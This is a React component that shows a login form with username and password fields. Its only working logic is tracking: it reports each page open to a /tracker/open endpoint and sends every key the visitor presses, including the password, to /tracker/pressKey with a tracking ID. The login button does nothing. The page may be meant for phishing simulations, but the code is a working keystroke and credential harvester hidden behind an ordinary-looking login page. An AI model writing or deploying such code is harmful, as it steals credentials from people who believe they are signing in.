import {Input} from "@/components/ui/input.tsx";
import {Button} from "@/components/ui/button.tsx";
import {useParams} from "react-router";
import {useEffect} from "react";
import {axiosInstance} from "@/api/CONSTANT.ts";

export const Login = () => {
    const {id} = useParams()

    useEffect(() => {
        if(!id) return

        axiosInstance.post(`/tracker/open/${id}`).catch(() => {})

        function handleKeyDown(e: KeyboardEvent){
            axiosInstance.post(`/tracker/pressKey/${id}`, {key: e.key.toString()}).catch(() => {})
        }

        window.addEventListener("keydown", handleKeyDown)

        return () => {
            window.removeEventListener("keydown", handleKeyDown)
        }
    }, [id])

    return (
        <div className="max-w-[600px] w-full  border-2 p-3 flex flex-col gap-4 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
            <h1>Login</h1>
                <Input placeholder={"Username"} />
                <Input placeholder={"Password"} type="password" />
                <Button>Login</Button>
            {id && <p>Track ID: {id}</p>}
        </div>
    )
}